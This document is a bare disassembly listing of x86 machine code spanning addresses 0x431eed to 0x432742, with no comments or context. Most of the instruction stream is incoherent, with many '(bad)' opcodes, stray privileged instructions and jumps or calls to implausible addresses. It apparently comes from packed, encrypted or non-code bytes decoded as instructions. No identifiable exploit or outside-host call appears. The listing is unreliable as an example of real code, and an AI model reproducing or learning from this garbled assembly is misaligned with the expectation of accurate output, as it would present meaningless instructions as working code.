  431eed:	je     0x431f34
  431eef:	mov    eax,DWORD PTR [edi]
  431ef1:	ror    BYTE PTR [ebp+0x4d],1
  431ef4:	or     DWORD PTR [ecx+0x4d03d004],0x3
  431efb:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  431f01:	mov    DWORD PTR [ebx],ebp
  431f03:	fadd   DWORD PTR [eax+0x75]
  431f06:	inc    eax
  431f07:	pop    eax
  431f08:	lea    ebx,[ecx+0x4f]
  431f0b:	push   0xb1000003
  431f10:	out    dx,eax
  431f11:	add    ebp,DWORD PTR [edx+edx*2]
  431f14:	add    BYTE PTR [ebx+ecx*4],bh
  431f17:	mov    ch,BYTE PTR [ebx]
  431f19:	jb     0x431f8d
  431f1b:	add    al,0x89
  431f1d:	push   eax
  431f1e:	call   0x842b6c90
  431f23:	add    DWORD PTR [eax+eax*1],eax
  431f26:	jae    0x431f3c
  431f28:	icebp  
  431f29:	inc    ebp
  431f2a:	mov    eax,DWORD PTR gs:[ecx]
  431f2d:	int3   
  431f2e:	out    dx,al
  431f2f:	loopne 0x431f7e
  431f31:	sub    eax,DWORD PTR [edx]
  431f33:	push   0xffffff83
  431f35:	pop    esi
  431f36:	push   cs
  431f37:	jl     0x431f52
  431f39:	add    al,0xaf
  431f3b:	xor    eax,0x832b6d00
  431f40:	mov    eax,DWORD PTR [edx]
  431f42:	rcr    BYTE PTR [ebp+0x754500dc],cl
  431f48:	ror    DWORD PTR [ebx+0x7dc8e803],1
  431f4e:	inc    ebp
  431f4f:	shr    ebx,0x3
  431f52:	or     DWORD PTR [eax],0x4
  431f55:	push   0xffffffa5
  431f57:	pop    esi
  431f58:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431f5f:	jmp    0x431fbe
  431f61:	mov    edi,0xff0272
  431f66:	fdivr  QWORD PTR [ebp+0x5d]
  431f69:	push   0x4e
  431f6b:	pop    ecx
  431f6c:	call   0x436371
  431f71:	mov    DWORD PTR [ebx],eax
  431f73:	in     al,0xc8
  431f75:	rol    BYTE PTR [ebp-0x75],0xc1
  431f79:	call   0xad215a
  431f7e:	pop    esi
  431f7f:	enter  0xceff,0x8b
  431f83:	repz mov ecx,DWORD PTR [ebp-0x34]
  431f87:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431f8e:	je     0x431f90
  431f90:	or     DWORD PTR [ebx-0x74183b24],eax
  431f96:	jne    0x431f7c
  431f98:	jmp    0x431f93
  431f9a:	push   DWORD PTR [edx-0x24]
  431f9d:	push   0x4d
  431f9f:	pop    ecx
  431fa0:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  431fa4:	jge    0x431fac
  431fa6:	mov    eax,eax
  431fa8:	sub    ebp,DWORD PTR [edx+0x24]
  431fab:	pop    esi
  431fac:	inc    ebp
  431fad:	mov    esp,0x8b6077
  431fb2:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  431fb8:	lods   al,BYTE PTR ds:[esi]
  431fb9:	add    BYTE PTR [ebx],bh
  431fbb:	enter  0xce73,0x49
  431fbf:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  431fc7:	stc    
  431fc8:	jge    0x43203c
  431fca:	jnp    0xdd42a339
  431fd0:	call   0xc620a6
  431fd5:	fadd   st(0),st
  431fd7:	dec    esi
  431fd8:	ins    BYTE PTR es:[edi],dx
  431fd9:	stc    
  431fda:	cmp    al,0x73
  431fdc:	push   ebp
  431fdd:	mov    eax,0xf8028b
  431fe2:	jne    0x431fa5
  431fe4:	mov    esi,ecx
  431fe6:	mov    esp,DWORD PTR [ebp+0x2c]
  431fe9:	add    edi,DWORD PTR [ebp-0x24]
  431fec:	sub    esp,eax
  431fee:	and    al,0x45
  431ff0:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431ff6:	sbb    al,0xee
  431ff8:	pop    esi
  431ff9:	call   0x832029
  431ffe:	fsubr  st,st(3)
  432000:	sti    
  432001:	add    BYTE PTR gs:[ecx],bh
  432004:	add    eax,esp
  432006:	add    DWORD PTR [esi],eax
  432008:	rol    DWORD PTR [ebp+0x8],0x29
  43200c:	mov    esp,eax
  43200e:	clc    
  43200f:	jne    0x432086
  432011:	mov    eax,0x8b0673
  432016:	loopne 0x43205d
  432018:	loopne 0x431fa3
  43201a:	lods   al,BYTE PTR ds:[esi]
  43201b:	int3   
  43201c:	inc    ebp
  43201d:	mov    DWORD PTR gs:[eax+edi*8],eax
  432021:	add    al,0xc3
  432023:	sub    ecx,DWORD PTR [ebp+0x47]
  432026:	(bad)  
  432028:	shr    BYTE PTR [ebp-0x1f],0xe8
  43202c:	add    eax,DWORD PTR [eax]
  43202e:	call   0x644e133
  432033:	add    esi,DWORD PTR [esi-0x3b2efc83]
  432039:	dec    esi
  43203a:	ins    DWORD PTR es:[edi],dx
  43203b:	in     al,dx
  43203c:	lea    eax,[eax]
  43203e:	inc    ebp
  43203f:	inc    ebp
  432040:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  432046:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  432050:	and    al,0xdc
  432052:	ror    DWORD PTR [edx+0x24],0xf7
  432056:	or     BYTE PTR [ebp+0x4c],dh
  432059:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  43205d:	stos   BYTE PTR es:[edi],al
  43205e:	adc    edx,edi
  432060:	inc    esp
  432061:	add    edi,DWORD PTR [eax]
  432063:	jne    0x432048
  432065:	mov    DWORD PTR [eax-0x7449db04],ecx
  43206b:	cmp    ecx,DWORD PTR [edi]
  43206d:	sub    BYTE PTR [ebp-0x7e],dl
  432070:	sar    ebp,0xb
  432073:	jmp    FWORD PTR [edi+0x2400392a]
  432079:	sub    esi,DWORD PTR [ebx-0x73]
  43207c:	mov    esp,DWORD PTR [ecx+edi*4]
  43207f:	mov    ecx,DWORD PTR [eax]
  432081:	and    BYTE PTR [eax],al
  432083:	jne    0x43204f
  432085:	sub    ebp,ecx
  432087:	sbb    BYTE PTR [esi+0x32],ah
  43208a:	dec    ebp
  43208b:	push   ebp
  43208c:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  432092:	ret    
  432093:	mov    edx,ebp
  432095:	leave  
  432096:	sub    DWORD PTR [esi+0x24],ebx
  432099:	ret    0x2b
  43209c:	pop    ax
  43209e:	push   ebp
  43209f:	rol    BYTE PTR [ebx],0xeb
  4320a2:	add    DWORD PTR [ecx+0x6c0001],0x40
  4320a9:	jb     0x432100
  4320ab:	ret    
  4320ac:	in     al,dx
  4320ad:	jecxz  0x43203a
  4320af:	push   esi
  4320b0:	xchg   esp,eax
  4320b1:	jne    0x4320b3
  4320b3:	cmp    edx,DWORD PTR [esi+0x1c]
  4320b6:	jne    0x43209c
  4320b8:	mov    eax,DWORD PTR [ebp-0x77]
  4320bb:	ror    DWORD PTR [ebx+0x899408],0xe0
  4320c2:	mov    esi,DWORD PTR [ebp-0x75]
  4320c5:	pop    esi
  4320c6:	nop
  4320c7:	mov    eax,DWORD PTR [eax]
  4320c9:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4320cf:	add    al,0x0
  4320d1:	inc    ebp
  4320d2:	mov    eax,DWORD PTR [ebx]
  4320d4:	mov    ebp,ebx
  4320d6:	cmp    al,0xf
  4320d8:	or     al,al
  4320da:	inc    ebp
  4320db:	inc    ebp
  4320dc:	mov    ebx,DWORD PTR ss:[eax+ecx*8+0xfc6c8b]
  4320e4:	mov    bh,0xc0
  4320e6:	push   ss
  4320e7:	ins    BYTE PTR es:[edi],dx
  4320e8:	push   ecx
  4320e9:	add    BYTE PTR [ecx-0x5],dl
  4320ec:	add    eax,0x17200
  4320f1:	sbb    al,0x85
  4320f3:	dec    esp
  4320f4:	je     0x43212e
  4320f6:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4320fa:	add    BYTE PTR [ebx],bh
  4320fc:	(bad)  
  4320fd:	and    al,0x39
  4320ff:	jae    0x43209d
  432101:	mov    cl,cl
  432103:	inc    DWORD PTR [esp]
  432106:	push   ebp
  432107:	shr    esp,0x8
  43210a:	in     al,dx
  43210b:	push   esp
  43210c:	add    DWORD PTR [eax],esp
  43210e:	add    bl,cl
  432110:	inc    ebp
  432111:	mov    bh,0x89
  432113:	add    ah,bh
  432115:	jmp    0xca7c305f
  43211a:	pushf  
  43211b:	dec    esp
  43211c:	mov    edx,0xf8178520
  432121:	fst    DWORD PTR [ebp+0x0]
  432124:	mov    BYTE PTR [eax],0xc4
  432127:	sub    edx,DWORD PTR [ebx-0x3f]
  43212a:	inc    ebp
  43212b:	add    eax,0xc601da
  432130:	mov    al,0xc6
  432133:	ins    BYTE PTR es:[edi],dx
  432134:	mov    DWORD PTR [eax+0x57],0x280545c1
  43213b:	dec    esp
  43213c:	jmp    DWORD PTR [eax]
  43213e:	inc    ebp
  43213f:	fnstcw WORD PTR [esi+0x29]
  432142:	test   BYTE PTR [eax],0xc6
  432145:	rol    BYTE PTR [eax],0xc0
  432148:	lea    ecx,[ebp-0x3cf0dbcb]
  43214e:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  432154:	inc    esi
  432155:	add    DWORD PTR [eax],ebx
  432157:	add    dh,bh
  432159:	mov    esi,DWORD PTR [edx+0x8]
  43215c:	(bad)  
  43215d:	fdiv   QWORD PTR ss:[ecx]
  432160:	(bad)  
  432161:	mov    bl,ch
  432163:	add    esi,eax
  432165:	add    dh,bl
  432167:	or     esi,eax
  432169:	mov    dl,0xdf
  43216b:	add    esi,eax
  43216d:	add    al,ah
  43216f:	push   cs
  432170:	mov    BYTE PTR [edx+0xc601e1],0xe2
  432177:	or     BYTE PTR [ebx],dh
  432179:	dec    ecx
  43217a:	lea    eax,[ebx]
  43217c:	xor    eax,0x18fc0fc7
  432181:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432182:	repz clc 
  432184:	add    eax,DWORD PTR [ebp+0x46]
  432187:	prefetcht0 BYTE PTR [ecx-0x2]
  43218b:	xor    eax,0x7c60872
  432190:	mov    esp,0xbd32c699
  432195:	pop    esi
  432196:	mov    cl,0xbe
  432199:	or     al,0xc6
  43219b:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  4321a2:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  4321a9:	add    dh,al
  4321ab:	mov    eax,ebx
  4321ad:	xor    DWORD PTR [ebx],0x35008dbc
  4321b3:	mov    ecx,DWORD PTR [edi]
  4321b5:	sbb    al,0x18
  4321b7:	inc    ebp
  4321b8:	xrelease mov DWORD PTR [ebx],0x188546f4
  4321bf:	clc    
  4321c0:	(bad)  
  4321c1:	ss jb  0x432160
  4321c4:	lea    ecx,[ecx+0x45ffe838]
  4321ca:	mov    ebp,esp
  4321cc:	fadd   st,st(6)
  4321ce:	dec    ebp
  4321cf:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4321d5:	out    0x1,eax
  4321d7:	inc    ebp
  4321d8:	lea    ebp,[ecx]
  4321da:	inc    esi
  4321dc:	dec    eax
  4321de:	enter  0xa33,0xc6
  4321e2:	push   ebp
  4321e3:	leave  
  4321e4:	(bad)  
  4321e5:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  4321eb:	add    BYTE PTR [ebp+0x44],al
  4321ee:	mov    eax,esp
  4321f0:	mov    WORD PTR [esi+0x44398300],?
  4321f6:	psubusw mm4,QWORD PTR [eax-0x78]
  4321fa:	add    BYTE PTR [ebx-0x1303f975],al
  432200:	add    BYTE PTR [ebp+0x1],0xeb
  432204:	add    BYTE PTR [ebp+0x38],al
  432207:	jmp    0xdbce6751
  43220c:	add    BYTE PTR [ebp+0x0],0xe8
  432210:	mov    DWORD PTR [ebp-0x48],eax
  432213:	sub    DWORD PTR [edi+0x45],ecx
  432216:	add    BYTE PTR [eax],ch
  432218:	js     0x43225f
  43221a:	data16 jle 0x4321a2
  43221d:	idiv   bh
  43221f:	inc    esp
  432220:	(bad)  
  432221:	fadd   st(7),st
  432223:	mov    dh,0x89
  432225:	and    DWORD PTR [esi+0x44],0xffffffff
  432229:	fld    DWORD PTR [ebx-0x767cbc78]
  43222f:	pop    es
  432230:	push   0x8d45ffec
  432235:	jmp    0xe6cc673d
  43223a:	push   0x45
  43223c:	jmp    edx
  43223e:	add    DWORD PTR [ebp+0xd],0xfffffff5
  432242:	mov    DWORD PTR [ebp+0x6c],eax
  432245:	(bad)  
  432247:	inc    ebp
  432248:	(bad)  
  432249:	out    dx,al
  43224a:	add    al,0x45
  43224c:	mov    edi,esp
  43224e:	outs   dx,BYTE PTR ds:[esi]
  43224f:	inc    ebp
  432250:	(bad)  
  432251:	jle    0x4321d6
  432253:	idiv   BYTE PTR ds:0x70bc8944
  432259:	mov    dh,0xff
  43225b:	or     DWORD PTR [ebp-0x762609bc],0xffffff88
  432262:	jb     0x4321e7
  432264:	dec    DWORD PTR [eax]
  432266:	mov    ebp,esp
  432268:	test   WORD PTR [ebp-0x1],ax
  43226f:	inc    ebp
  432270:	ror    BYTE PTR [ebx-0x137a279a],0xff
  432277:	adc    edi,edi
  432279:	mov    ebp,edi
  43227b:	mov    eax,DWORD PTR [eax]
  43227d:	cmp    BYTE PTR [esi-0x1],ah
  432280:	test   DWORD PTR [ebx],edi
  432282:	push   DWORD PTR [ebp-0x1]
  432285:	mov    DWORD PTR [esi-0x48],ebp
  432288:	add    BYTE PTR [ebp+0x66],al
  43228b:	jmp    0x432212
  43228d:	pushf  
  43228e:	dec    DWORD PTR [ebx-0x7f940301]
  432294:	add    BYTE PTR [ecx],al
  432296:	data16 add BYTE PTR [ebp-0x7a00c8],al
  43229d:	add    al,al
  43229f:	add    BYTE PTR [esi+0x45],ah
  4322a2:	test   DWORD PTR [ebx+0xff7cff],ecx
  4322a8:	inc    eax
  4322a9:	mov    DWORD PTR [eax],eax
  4322ab:	mov    esp,DWORD PTR [esi-0x4]
  4322ae:	inc    ebp
  4322af:	cmp    BYTE PTR [eax+0x4701],0x38
  4322b6:	mov    DWORD PTR [ebp-0x7e],ebp
  4322b9:	add    BYTE PTR [edi-0x73],al
  4322bc:	push   0xffffffcd
  4322be:	mov    WORD PTR [ebp+0x64],ax
  4322c2:	(bad)  
  4322c3:	call   eax
  4322c5:	mov    esp,esi
  4322c7:	data16 cmc 
  4322c9:	test   DWORD PTR [ebp-0x1],eax
  4322cc:	(bad)  
  4322ce:	out    0xc0,eax
  4322d0:	lea    esp,[esi-0x30]
  4322d3:	test   DWORD PTR [edx+0x44ff80ff],ecx
  4322d9:	inc    edi
  4322da:	jmp    0x75ff:0x40858866
  4322e1:	dec    DWORD PTR [ebp-0x7a992f40]
  4322e7:	test   esi,edi
  4322e9:	(bad)  
  4322ea:	(bad)  
  4322eb:	inc    DWORD PTR [ebp-0x9901b9]
  4322f1:	test   DWORD PTR [ebx+0x51fff4ff],ecx
  4322f7:	rcl    BYTE PTR [ecx+0x66],0x33
  4322fb:	test   DWORD PTR [ebx+0xff72ff],edi
  432301:	inc    edi
  432302:	ret    
  432303:	mov    ax,WORD PTR [ebp-0x3f0004]
  43230a:	push   eax
  43230b:	mov    DWORD PTR [ebp-0x77],0xff98748b
  432312:	add    BYTE PTR [ebx-0x764f0839],al
  432318:	push   DWORD PTR [esi+0x1]
  43231b:	inc    DWORD PTR [eax]
  43231d:	mov    eax,0xff99ff
  432322:	or     BYTE PTR [ecx-0x7a87bb],cl
  432328:	jne    0x4322e2
  43232a:	add    DWORD PTR [edx-0x76edff74],0xff707a8d
  432334:	mov    ecx,0xd74fb8
  432339:	add    cl,al
  43233b:	mov    DWORD PTR [ecx-0x3f007784],ecx
  432341:	or     DWORD PTR [ebx+0x558966e4],0x7e
  432348:	(bad)  
  432349:	(bad)  
  43234a:	std    
  43234b:	mov    eax,0x8c2789
  432350:	ret    0x6689
  432353:	adc    BYTE PTR [ebp+0x40],0x8d
  432357:	add    bh,ah
  432359:	mov    WORD PTR [ebp-0x70],ax
  43235d:	(bad)  
  43235e:	ret    0x6605
  432361:	or     BYTE PTR [ebp-0x77],dl
  432364:	lea    eax,[ecx+eiz*8-0x6b1676bb]
  43236b:	loop   0x4322f6
  43236d:	(bad)  
  43236e:	xchg   esi,eax
  43236f:	aam    0xcf
  432371:	out    dx,al
  432372:	mov    DWORD PTR [esi-0x68],edi
  432375:	inc    ebp
  432376:	dec    edx
  432377:	pop    ecx
  432378:	mov    edx,DWORD PTR [eax]
  43237a:	repnz push bp
  43237d:	or     BYTE PTR [ebx+0x5510663a],0x49
  432384:	(bad)  
  432385:	repnz cmp eax,0xa0898945
  43238b:	mov    ah,0x89
  43238d:	jmp    DWORD PTR [edx+0x66b0418d]
  432393:	inc    DWORD PTR [ebp+0x50]
  432396:	add    DWORD PTR [ebp+0x3],0xffffffbe
  43239a:	mov    DWORD PTR [eax],ecx
  43239c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43239d:	pop    es
  43239e:	inc    ecx
  43239f:	(bad)  
  4323a0:	cwd    
  4323a2:	inc    ebp
  4323a3:	xor    ah,BYTE PTR [esi+0x3]
  4323a6:	dec    ebp
  4323a7:	push   eax
  4323a8:	inc    bp
  4323aa:	jge    0x43232f
  4323ac:	mov    esp,DWORD PTR [esi-0x18]
  4323af:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4323b5:	add    DWORD PTR [ebx],esi
  4323b7:	add    BYTE PTR [ebx],al
  4323b9:	test   DWORD PTR [ebx],esi
  4323bb:	(bad)  
  4323bc:	inc    WORD PTR [ebp+0x0]
  4323c0:	mov    eax,DWORD PTR [eax]
  4323c2:	call   0x8898daf7
  4323c7:	mov    esi,eax
  4323c9:	clc    
  4323ca:	ret    
  4323cb:	rol    cl,0xa
  4323ce:	mov    DWORD PTR ds:0x7c0ec88,esi
  4323d4:	mov    edx,edi
  4323d6:	pushf  
  4323d7:	pop    es
  4323d8:	jmp    DWORD PTR [edx+0x66]
  4323db:	add    BYTE PTR [ebp-0x990175],al
  4323e1:	inc    ebp
  4323e2:	test   DWORD PTR [ebx-0x2f00ea02],eax
  4323e8:	push   ebp
  4323e9:	mov    edi,eax
  4323eb:	mov    dh,BYTE PTR [eax+0x266ff51]
  4323f1:	push   ebp
  4323f2:	add    BYTE PTR [ebx-0x764b0777],al
  4323f8:	dec    DWORD PTR [esi+0x661851e8]
  4323fe:	add    BYTE PTR [ebp-0x7b],dl
  432401:	cmp    esi,0x3
  432404:	dec    DWORD PTR [ecx+0x51fe9285]
  43240a:	jmp    DWORD PTR [esi-0x75]
  43240d:	push   ebp
  43240e:	hlt    
  43240f:	data16 (bad) 
  432411:	dec    ebp
  432412:	ret    
  432413:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  432419:	lea    edx,[eax-0x1]
  43241c:	jne    0x4323ef
  43241e:	dec    DWORD PTR [ecx-0x2f7a63f8]
  432424:	dec    BYTE PTR [ecx+0x51559eff]
  43242a:	mov    DWORD PTR [esi-0x4c],esp
  43242d:	push   ebp
  43242e:	jmp    DWORD PTR [esi-0x18]
  432431:	inc    ebp
  432432:	sbb    BYTE PTR [ebp-0x767ad900],cl
  432438:	(bad)  
  432439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43243a:	inc    eax
  43243c:	test   DWORD PTR [esi-0x2],esp
  43243f:	inc    ebp
  432440:	dec    DWORD PTR [ebp-0x760bde75]
  432446:	(bad)  
  432447:	test   al,0xc3
  432449:	mov    DWORD PTR [ebp-0x769b56],ecx
  43244f:	lods   al,BYTE PTR ds:[esi]
  432450:	push   eax
  432451:	inc    ebp
  432452:	jne    0x432463
  432454:	dec    DWORD PTR [ebp+0x8]
  432457:	mov    eax,DWORD PTR [edi]
  432459:	sbb    al,0x0
  43245b:	(bad)  
  43245c:	mov    eax,0xc14fc3
  432461:	mov    DWORD PTR [eax-0x64],edi
  432464:	inc    bp
  432466:	test   DWORD PTR [edi],ecx
  432468:	dec    DWORD PTR [ebp-0x1]
  43246b:	xor    eax,edi
  43246d:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  432473:	inc    ebp
  432474:	xor    DWORD PTR [ebx],0x43
  432477:	mov    WORD PTR [ebp-0x1bc],ax
  43247e:	lea    ecx,[ecx-0x7677fe]
  432484:	inc    esi
  432485:	(bad)  
  432486:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  43248d:	pushf  
  43248e:	rol    DWORD PTR [ebp-0x72019a],0xff
  432495:	add    bh,bh
  432497:	add    BYTE PTR [edi],cl
  432499:	test   DWORD PTR [eax],eax
  43249b:	(bad)  
  43249c:	dec    WORD PTR [ebp-0xff002d]
  4324a3:	mov    DWORD PTR [eax-0x48],esi
  4324a6:	add    bh,bh
  4324a8:	lea    cx,[ebp-0x50]
  4324af:	push   eax
  4324b0:	rol    BYTE PTR [ebp+0x0],1
  4324b3:	xor    esp,DWORD PTR [esi+0x3]
  4324b6:	lea    edx,[eax-0x1]
  4324b9:	test   edi,edi
  4324bb:	dec    DWORD PTR [ebp-0x1]
  4324be:	mov    edi,edi
  4324c0:	dec    eax
  4324c1:	clc    
  4324c2:	call   DWORD PTR [ebp-0x73]
  4324c5:	lea    esi,[eax+0x51ffff88]
  4324cb:	lea    ecx,[ebp-0x78]
  4324ce:	test   WORD PTR [ebp-0x2],ax
  4324d5:	popf   
  4324d6:	push   ecx
  4324d7:	add    BYTE PTR [ecx-0x77],dl
  4324da:	xor    edi,DWORD PTR [eax-0x724a007d]
  4324e0:	cdq    
  4324e1:	mov    al,0x32
  4324e3:	inc    DWORD PTR [ebx]
  4324e5:	push   eax
  4324e6:	push   ecx
  4324e7:	inc    ebp
  4324e8:	shl    BYTE PTR [ebx],1
  4324ea:	lea    eax,[ebx]
  4324ec:	call   DWORD PTR [eax-0x1]
  4324ef:	test   DWORD PTR [ebx],esi
  4324f1:	inc    DWORD PTR [eax-0x1]
  4324f4:	(bad)  
  4324f5:	(bad)  
  4324f6:	(bad)  
  4324f7:	clc    
  4324f8:	call   DWORD PTR [ebp+0x50]
  4324fb:	jmp    0xcc2675
  432500:	inc    esp
  432501:	jae    0x432502
  432503:	add    BYTE PTR [ecx-0x384f73],cl
  432509:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  43250f:	mov    eax,DWORD PTR [ecx]
  432511:	data16 add BYTE PTR [ebp-0xb50077],al
  432518:	inc    eax
  43251a:	lea    esp,[esi+0x1c]
  43251d:	test   DWORD PTR [ecx-0xb301],ecx
  432523:	inc    edi
  432524:	(bad)  
  432525:	dec    si
  432527:	test   edi,edi
  432529:	push   DWORD PTR [ecx]
  43252b:	(bad)  
  43252c:	jnp    0x43257d
  43252e:	(bad)  
  43252f:	mov    edx,DWORD PTR [edx-0x7d]
  432532:	(bad)  
  432533:	mov    ebx,0x563a8935
  432538:	(bad)  
  432539:	call   FWORD PTR [esi-0x47]
  43253c:	inc    DWORD PTR ds:0x893000e2
  432542:	(bad)  
  432543:	pop    eax
  432544:	mov    ah,0xff
  432546:	(bad)  
  432547:	mov    ecx,0x5745
  43254c:	dec    DWORD PTR [ecx-0xf7a501]
  432552:	(bad)  
  432553:	mov    ecx,0x456108
  432558:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  43255e:	test   BYTE PTR [ebp-0x72ff23fd],cl
  432564:	inc    BYTE PTR gs:[eax]
  432567:	inc    DWORD PTR [ebp-0x73]
  43256a:	ss (bad) 
  43256c:	pushf  
  43256d:	inc    edi
  43256f:	mov    ebx,eax
  432571:	hlt    
  432572:	test   DWORD PTR [ecx-0xbab708],ecx
  432578:	cmp    bh,BYTE PTR [esi+0x7c7089c]
  43257e:	lock into 
  432580:	test   eax,eax
  432582:	clc    
  432583:	mov    ebx,0x367245
  432588:	lahf   
  432589:	retf   
  43258a:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  432590:	add    edi,edi
  432592:	add    BYTE PTR [ecx+0x45],dl
  432595:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  43259c:	mov    edx,DWORD PTR [ecx-0x74]
  43259f:	inc    DWORD PTR [eax]
  4325a1:	cld    
  4325a2:	mov    eax,DWORD PTR [ebp-0x6f0175]
  4325a8:	add    BYTE PTR [ebp-0x1b0177],al
  4325ae:	jge    0x4325f5
  4325b0:	test   DWORD PTR [ebx+0xff9875],ecx
  4325b6:	sbb    BYTE PTR [esi+0x55],ah
  4325b9:	xchg   ebp,eax
  4325ba:	call   0x4320be
  4325bf:	push   edi
  4325c0:	inc    ebp
  4325c1:	mov    dx,WORD PTR [ebp-0xfc0075]
  4325c8:	cmp    al,0x85
  4325ca:	ud0    eax,DWORD PTR [ebp-0x1]
  4325ce:	test   DWORD PTR [edi+0x74],ecx
  4325d1:	dec    edi
  4325d2:	inc    DWORD PTR [ebp-0xf70004]
  4325d8:	dec    DWORD PTR [edi-0x75]
  4325db:	dec    edi
  4325dc:	cld    
  4325dd:	test   DWORD PTR [eax+0xff01ff],eax
  4325e3:	icebp  
  4325e4:	add    BYTE PTR [edi-0x3a],cl
  4325e7:	test   ebx,eax
  4325e9:	inc    BYTE PTR [ebp-0x1]
  4325ec:	jne    0x4325ee
  4325ee:	mov    eax,DWORD PTR [eax]
  4325f0:	cld    
  4325f1:	xor    BYTE PTR [ecx+0x500155],cl
  4325f7:	push   ebp
  4325f8:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4325fe:	add    BYTE PTR [ebp+0x35e90f50],al
  432604:	add    al,BYTE PTR [eax]
  432606:	add    BYTE PTR [ebx-0x38fe4f80],al
  43260c:	add    ah,ch
  43260e:	or     BYTE PTR [ebp+0x4501f845],dh
  432614:	jmp    0xdf290f
  432619:	(bad)  
  43261a:	nop    ecx
  43261d:	test   DWORD PTR [ebp+0x4502f8],eax
  432623:	cmp    BYTE PTR [ebp-0x64],cl
  432626:	mov    eax,edi
  432628:	mov    ebx,DWORD PTR [eax+edx*2]
  43262b:	add    eax,0x45fef885
  432630:	dec    DWORD PTR [ebx+0x339445]
  432636:	add    ecx,DWORD PTR [ecx+0x4500f889]
  43263c:	dec    DWORD PTR [ebx-0x460f0375]
  432642:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432643:	add    esi,edi
  432645:	add    bh,bh
  432647:	rdpmc  
  432649:	add    BYTE PTR [ebx],0x1
  43264c:	mov    DWORD PTR [eax],eax
  43264e:	add    al,0x45
  432650:	dec    DWORD PTR [ecx-0x360b3373]
  432656:	dec    DWORD PTR [esi]
  432658:	push   eax
  432659:	jne    0x4326a0
  43265b:	mov    esi,DWORD PTR [ebx]
  43265d:	cld    
  43265e:	add    ebp,ebx
  432660:	push   eax
  432661:	inc    DWORD PTR [ebp-0x75]
  432664:	add    eax,0x800e4
  432669:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43266f:	mov    DWORD PTR [ecx],eax
  432671:	sbb    al,0x0
  432673:	leave  
  432674:	test   DWORD PTR [edi-0x2],eax
  432677:	jne    0x432678
  432679:	call   0xff44117e
  43267e:	xor    BYTE PTR [ebp+0x4d],al
  432681:	mov    edi,edi
  432683:	enter  0x8,0x4d
  432687:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43268d:	mov    eax,DWORD PTR [eax]
  43268f:	cld    
  432690:	add    DWORD PTR [ecx],ebx
  432692:	inc    ebp
  432693:	dec    ebp
  432694:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43269a:	inc    eax
  43269b:	dec    DWORD PTR [ecx-0x270375]
  4326a1:	add    BYTE PTR [ebx-0x39d72701],cl
  4326a7:	xchg   ecx,eax
  4326a8:	ret    
  4326a9:	add    BYTE PTR [ebp-0x830075],al
  4326af:	add    BYTE PTR [ebp-0x75],al
  4326b2:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4326b8:	lea    edi,[edi-0xc]
  4326bb:	add    bh,bh
  4326bd:	mov    edx,DWORD PTR [eax-0x7b]
  4326c0:	inc    ebp
  4326c1:	rdpmc  
  4326c3:	jne    0x4326c8
  4326c5:	add    BYTE PTR [eax-0x75],dl
  4326c8:	inc    ebp
  4326c9:	clc    
  4326ca:	add    eax,0x400009
  4326cf:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4326d5:	mov    eax,DWORD PTR [ecx]
  4326d7:	in     al,dx
  4326d8:	add    dh,al
  4326da:	test   ebx,eax
  4326dc:	inc    BYTE PTR [ebp-0xff0001]
  4326e2:	add    BYTE PTR [ebp-0x43],al
  4326e5:	cmp    esi,0xfffffff8
  4326e8:	(bad)  
  4326e9:	push   DWORD PTR [eax]
  4326eb:	add    BYTE PTR [ebp-0x3a],dl
  4326ee:	test   ebx,eax
  4326f0:	je     0x432677
  4326f2:	mov    edi,edi
  4326f4:	sbb    al,0xff
  4326f6:	test   DWORD PTR gs:[eax],eax
  4326f9:	(bad)  
  4326fa:	js     0x4326fb
  4326fc:	add    BYTE PTR [ebx-0x39b20bdd],cl
  432702:	sub    eax,ebx
  432704:	mov    ecx,DWORD PTR [ebx-0x55130377]
  43270a:	add    eax,DWORD PTR [eax]
  43270c:	dec    ebp
  43270d:	push   eax
  43270e:	mov    al,BYTE PTR [ebp+0x1]
  432711:	mov    eax,DWORD PTR [ebp-0x68]
  432714:	mov    eax,DWORD PTR [eax]
  432716:	sbb    bh,al
  432718:	or     ah,dh
  43271a:	dec    ebp
  43271b:	inc    DWORD PTR [eax+0x4]
  43271e:	push   ecx
  43271f:	add    BYTE PTR [edx-0x1],dh
  432722:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  432728:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  432732:	add    ecx,DWORD PTR [ecx-0x1be77477]
  432738:	push   ecx
  432739:	cmp    BYTE PTR [ebx],al
  43273b:	inc    ebp
  43273c:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  432742:	(bad)  
